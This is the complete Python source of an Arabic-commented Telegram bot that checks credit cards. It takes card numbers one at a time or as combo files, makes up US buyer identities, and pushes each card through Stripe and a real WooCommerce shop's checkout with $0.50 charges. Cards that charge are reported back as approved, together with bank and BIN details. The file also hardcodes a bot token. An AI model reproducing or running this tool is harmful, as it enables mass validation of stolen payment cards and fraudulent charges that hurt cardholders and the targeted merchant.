import telebot
import time
import threading
from telebot import types
import requests, random, os, pickle, time, re
from bs4 import BeautifulSoup
# توكن البوت
token = '8230903181:AAGABEadDSHOnjbCBfKM4Jepf2KzJFYAhbo'
bot = telebot.TeleBot(token, parse_mode="HTML")

#ايدي حسابك
admin = 7937714508
myid = ['7937714508']
stop = {}
user_gateways = {}
stop_flags = {} 
stopuser = {}
command_usage = {}

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))


@bot.message_handler(commands=["start"])
def handle_start(message):
    sent_message = bot.send_message(chat_id=message.chat.id, text="💥 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    bot.edit_message_text(chat_id=message.chat.id,
                          message_id=sent_message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Stripe Charge)",
                          reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    name = call.from_user.first_name

    bot.send_message(call.message.chat.id, 
        '''- مرحباً بك في بوت فحص Stripe Charge 0.50$ ✅


للفحص اليدوي [/chk] و للكومبو فقط ارسل الملف.

اختر نوع الفحص وسيبدأ البوت بأعطائك افضل النتائج مع المطور علاء  @XX_VV_88''')


    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Stripe Auth)",
                          reply_markup=mes)





import requests, re, uuid
from urllib.parse import urlencode
import random
from random import choice, choices
from bs4 import *
def UniversalStripeChecker(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.Session()



	first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef"]
	last_names = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Jackson", "White", "Harris"]
	
	us_streets = [
	    "Main St", "Oak St", "Pine St", "Maple Ave", "Cedar St", "Elm St", "Washington Ave", "Lakeview Dr"
	]
	
	us_cities = [
	    ("New York", "10001"),
	    ("Los Angeles", "90001"),
	    ("Chicago", "60601"),
	    ("Houston", "77001"),
	    ("Phoenix", "85001"),
	    ("Philadelphia", "19101"),
	    ("San Antonio", "78201"),
	    ("San Diego", "92101"),
	    ("Dallas", "75201"),
	    ("San Jose", "95101")
	]
	
	def generate_us_address():
	    house_number = random.randint(100, 9999)
	    street = random.choice(us_streets)
	    city, zipcode = random.choice(us_cities)
	    full_address = f"{house_number} {street}"
	    return city, full_address, zipcode
	
	def generate_us_phone():
	    area_codes = ["212", "213", "312", "347", "415", "512", "602", "646", "718", "917", "929", "305", "202"]
	    area = random.choice(area_codes)
	    mid = random.randint(200, 999)
	    last = random.randint(1000, 9999)
	    return f"+1{area}{mid}{last}"
	
	first_name = random.choice(first_names)
	last_name = random.choice(last_names)
	acc = f"{first_name.lower()}.{last_name.lower()}@example.com"
	city, address, postcode = generate_us_address()
	phone = generate_us_phone()
	
	user_info = {
	    "first_name": first_name,
	    "last_name": last_name,
	    "email": acc,
	    "phone": phone,
	    "country": "US",
	    "city": city,
	    "address": address,
	    "postcode": postcode,
	}
	
	
	
	
	r.get("https://ahlulbayt.co.uk/")
	
	r.get("https://ahlulbayt.co.uk/fire-tv-stick/")
	
	r.post(
	    "https://ahlulbayt.co.uk/fire-tv-stick/",
	    data={
	        "payyourprice_contribution": "0.5",
	        "quantity": "1",
	        "add-to-cart": "158",
	        "_wp_http_referer": "https://ahlulbayt.co.uk/fire-tv-stick/",
	    },
	)
	
	checkout_html = r.get("https://ahlulbayt.co.uk/checkout/").text
	
	match = re.search(r'id="woocommerce-process-checkout-nonce"[^>]*value="(.*?)"', checkout_html)
	
	nonce = match.group(1) if match else None
	
	match = re.search(r'"key"\s*:\s*"pk_live_[\w]+"', checkout_html)
	key = match.group().split(":")[1].strip('" ')
	
	
	r.post(
	    "https://ahlulbayt.co.uk/?wc-ajax=update_order_review",
	    headers={'x-requested-with': 'XMLHttpRequest'},
	    data=urlencode({
	        "security": "6afb62e83d",
	        "payment_method": "stripe",
	        "country": user_info["country"],
	        "postcode": user_info["postcode"],
	        "city": user_info["city"],
	        "address": user_info["address"],
	        "has_full_address": "true",
	        "post_data": urlencode({
	            "billing_first_name": user_info["first_name"],
	            "billing_last_name": user_info["last_name"],
	            "billing_country": user_info["country"],
	            "billing_address_1": user_info["address"],
	            "billing_city": user_info["city"],
	            "billing_postcode": user_info["postcode"],
	            "billing_phone": user_info["phone"],
	            "billing_email": user_info["email"],
	            "payment_method": "stripe",
	            "terms-field": "1",
	            "woocommerce-process-checkout-nonce": nonce,
	            "_wp_http_referer": "/?wc-ajax=update_order_review"
	        }),
	    }),
	)
	
	
	stripe_data = {
	    "type": "card",
	    "billing_details[name]": f"{user_info['first_name']} {user_info['last_name']}",
	    "billing_details[email]": user_info["email"],
	    "billing_details[phone]": user_info["phone"],
	    "billing_details[address][line1]": user_info["address"],
	    "billing_details[address][city]": user_info["city"],
	    "billing_details[address][postal_code]": user_info["postcode"],
	    "billing_details[address][country]": user_info["country"],
	    "card[number]": n,
	    "card[exp_month]": mm,
	    "card[exp_year]": yy,
	    "card[cvc]": cvc,
	    "guid": str(uuid.uuid4().hex),
	    "muid": str(uuid.uuid4().hex),
	    "sid": str(uuid.uuid4().hex),
	    "payment_user_agent": "stripe.js/6296643727; stripe-js-v3/6296643727; card-element",
	    "key": key,
	    "time_on_page": "11111",
	
	}
	
	res = r.post("https://api.stripe.com/v1/payment_methods", data=stripe_data)
	stripe_response = res.json()
	
	
	pm_id = stripe_response["id"]
	
	
	checkout_data = {
	    "billing_first_name": user_info["first_name"],
	    "billing_last_name": user_info["last_name"],
	    "billing_country": user_info["country"],
	    "billing_address_1": user_info["address"],
	    "billing_city": user_info["city"],
	    "billing_postcode": user_info["postcode"],
	    "billing_phone": user_info["phone"],
	    "billing_email": user_info["email"],
	    "payment_method": "stripe",
	    "terms": "on",
	    "terms-field": "1",
	    "woocommerce-process-checkout-nonce": nonce,
	    "_wp_http_referer": "/?wc-ajax=update_order_review",
	    "stripe_source": pm_id,
	}
	
	res = r.post("https://ahlulbayt.co.uk/?wc-ajax=checkout", data=checkout_data)
	msg=res.text
	if 'success' in msg or 'Thank you for your order.' in msg or 'successed' in msg or 'Thank you' in msg:
		return 'CHARGED 0.50$'
	else:
		try:
			soui = (res.json()['messages'])
			soup = BeautifulSoup(soui, 'html.parser')
			message = soup.find('li').get_text(strip=True)
			msgi = message
			return msgi
		except:pass










import requests
from bs4 import BeautifulSoup
import pycountry
import re
def reg(cc):
	regex = r'\d+'
	matches = re.findall(regex, cc)
	match = ''.join(matches)
	n = match[:16]
	mm = match[16:18]
	yy = match[18:20]
	if yy == '20':
		yy = match[18:22]
		if n.startswith("3"):
			cvc = match[22:26]
		else:
			cvc = match[22:25]
	else:
		if n.startswith("3"):
			cvc = match[20:24]
		else:
			cvc = match[20:23]
	cc = f"{n}|{mm}|{yy}|{cvc}"
	if not re.match(r'^\d{16}$', n):
		return
	if not re.match(r'^\d{3,4}$', cvc):
		return
	return cc
import threading, random
from datetime import datetime
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def my_ali4(message):
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		current_time = datetime.now()
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 10:
			bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		bran = UniversalStripeChecker
		last = str(bran(cc))
	except Exception as e:
		last='Error'
		
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<strong>#Stripe_Charge 0.50$ 🔥 [/chk]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'Approved Charge! ✅' if 'CHARGED 0.50$' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=7937714508'>🇵🇸 ꙰:『 αℓαα ∂єν 』 🇩🇿 ꙰:</a> - 🍀</strong>'''

	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
		








import random
import time
import threading
import requests
from telebot import types
@bot.message_handler(content_types=('document'))
def GTA(message):
	user_id = str(message.from_user.id)
	name = message.from_user.first_name or message.from_user.username or "User"

	bts=types.InlineKeyboardMarkup()
	soso=types.InlineKeyboardButton(text='Stripe Charge', callback_data='ottpa2')
	bts.add(soso)
	bot.reply_to(message,'Select the type of examination', reply_markup=bts)
	try:
		file_info = bot.get_file(message.document.file_id)
		downloaded = bot.download_file(file_info.file_path)
		filename = f"com{user_id}.txt"
		with open(filename, "wb") as f:
			f.write(downloaded)
	except Exception as e:
		bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
	def my_ali():
		global index
		user_id = str(call.from_user.id)
		passs = 0
		basl = 0
		tote = 0
		filename = f"com{user_id}.txt"
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		with open(filename, 'r') as file:
				lino = file.readlines()
				total = len(lino)
				stopuser.setdefault(user_id, {})['status'] = 'start'
				for cc in lino:
					if stopuser.get(user_id, {}).get('status') == 'stop':
						bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f'''The Has Stopped Checker Stripe Charge. 🤓
        
Approved! : {passs}
Declined! : {basl}
Total! : {passs + basl} / {total}
Dev! : @XX_VV_88''')

						return

					try:
						start_time = time.time()
						bran = UniversalStripeChecker
						last = str(bran(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"- Approved! ✅ : [ {passs} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {basl} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
					mes.add(cm1, status, cm3,cm4, cm5 ,stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker To Stripe Charge ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                    
					n = cc.split("|")[0]
					mm = cc.split("|")[1]
					yy = cc.split("|")[2]
					cvc = cc.split("|")[3].strip()
				
					cc = n+'|'+mm+'|'+yy+'|'+cvc
					msg=  f'''<strong>#Stripe_Charge 0.50$ 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved Charge! ✅</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=7937714508'>🇵🇸 ꙰:『 αℓαα ∂єν 』 🇩🇿 ꙰:</a> - 🍀</strong>'''

					if 'CHARGED 0.50$' in last:
						passs += 1
						bot.send_message(call.from_user.id, msg, parse_mode="HTML")
					else:
						basl +=1
					time.sleep(7)


		bot.edit_message_text(
		chat_id=call.message.chat.id, 
		message_id=call.message.message_id,
		text=f'''The Inspection Was Completed By Stripe Charge Pro. 🥳
    
Approved!: {passs}
Declined!: {basl}
Total!: {passs + basl}
Dev!: @XX_VV_88''')
					
						
	my_thread = threading.Thread(target=my_ali)
	my_thread.start()				

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

def dato(zh):
	try:
		api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
		brand=api_url["brand"]
		card_type=api_url["type"]
		level=api_url["level"]
		bank=api_url["bank"]
		country_name=api_url["country_name"]
		country_flag=api_url["country_flag"]
		mn = f'''[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
		return mn
	except Exception as e:
		print(e)
		return 'No info'



print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)